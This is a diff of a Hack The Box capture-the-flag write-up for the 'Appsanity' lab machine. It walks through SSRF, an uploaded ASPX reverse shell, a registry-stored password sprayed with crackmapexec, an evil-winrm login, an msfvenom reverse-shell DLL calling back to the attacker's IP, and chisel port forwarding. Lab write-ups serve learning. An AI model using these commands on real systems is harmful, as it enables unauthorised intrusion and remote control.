@@ -106,7 +106,7 @@ Upload any pdf you chose and intercept the request, keep the pdf magic bytes and
 
 ![appsanity7](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/3fabf175-e43d-4b60-ba0b-accc3924d0b6)
 
-To execute the shell, navigate to the "issue prescriptions" site, in the prescription link we can try an ssrf attack. Enter the url `http://127.0.0.1:8080` to view the medical reports, in the output you can view the path of the uploaded reports. 
+To execute the shell, navigate to the "issue prescriptions" site, in the prescription link try an ssrf attack. Enter the url `http://127.0.0.1:8080` to view the medical reports, in the output you can view the path of the uploaded reports. 
 ```markdown
 .../ViewReport.aspx?file=f6673d08-592a-44a3-a863-da678b74e0b4_document.aspx
 ```
@@ -122,13 +122,13 @@ Using this reverse shell we can get the user flag.
 
 ### PHASE 3: System
 Enumerate the user.
-``markdown
+```markdown
 whoami
 appsanity\svc_exampanel
 ```
 Enumerate the system.
 ```markdown
-systeminfo
+> systeminfo
 
 Host Name:                 APPSANITY
 OS Name:                   Microsoft Windows 10 Pro
@@ -137,7 +137,7 @@ System Type:               x64-based PC
 ```
 Enumerate the system local users.
 ```markdown
-net user
+> net user
 
 User accounts for \\APPSANITY
 
@@ -149,14 +149,15 @@ The command completed successfully.
 ```
 Rremember there was a 5985 service open, check who is using it.
 ```markdown
-net localgroup "remote management users"
+> net localgroup "remote management users"
+
 Alias name     remote management users
 Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
 
 Members
-
 -------------------------------------------------------------------------------
 devdoc
+
 The command completed successfully.
 ```
 It seems our next goal is to move laterally to user devdoc to gain winrm remote access.
@@ -168,11 +169,11 @@ This can be decompiled the dll with dnspy, where we find several calls to a regi
 
 ![appsanity9](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/8543a22f-208d-49cd-a1ec-11fe4ef65bb4)
 
-Next step is to query the register to find a password in key HKEY_LOCAL_MACHINE\software\meddigi. The password is `1g0tTh3R3m3dy!!`
+Next step is to query the register. You can find a password in key HKEY_LOCAL_MACHINE\software\meddigi. The password is `1g0tTh3R3m3dy!!`
 
 ![appsanity10](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/b4918add-8efe-4b55-9c1d-d3413958529d)
 
-You can spray the password with crackmapexec to find the credentials work for user `devdoc:1g0tTh3R3m3dy!!`
+If you spray the password with crackmapexec you find the credentials work for user `devdoc:1g0tTh3R3m3dy!!`. Use the user list we have previously found.
 ```markdown
 evil-winrm -u devdoc -p '1g0tTh3R3m3dy!!' -i meddigi.htb
 ```
@@ -190,8 +191,7 @@ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.xxx.xxx lport=9001 -f dll 
 ```
 Investigating how to launch the process, we discover the process is running locally on port 100.
 ```markdown
-# enumerate listening processes
-netstat -ano
+> netstat -ano
 
 Active Connections
 
@@ -207,39 +207,11 @@ Active Connections
 ```
 To forward this port to our attacking machine, we use chisel.
 ```markdown
-./chisel64 server -p 8000 --reverse
-.\chisel64.exe client 10.10.xxx.xxx:8000 R:100:127.0.0.1:100
+> ./chisel64 server -p 8000 --reverse
+> .\chisel64.exe client 10.10.xxx.xxx:8000 R:100:127.0.0.1:100
 ```
 ![appsanity12](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/c159af4d-a929-479f-96a2-e7a985021e82)
 
 In order to trigger the reverse shell, just execute the "upload" feature in the running port. The application calls the malicious dll and the shell is received.
 
 ![appsanity13](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/aa441c3b-413a-45f3-a7dc-f0ad841d5419)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-### PHASE 3: System
-
-
-
-
-
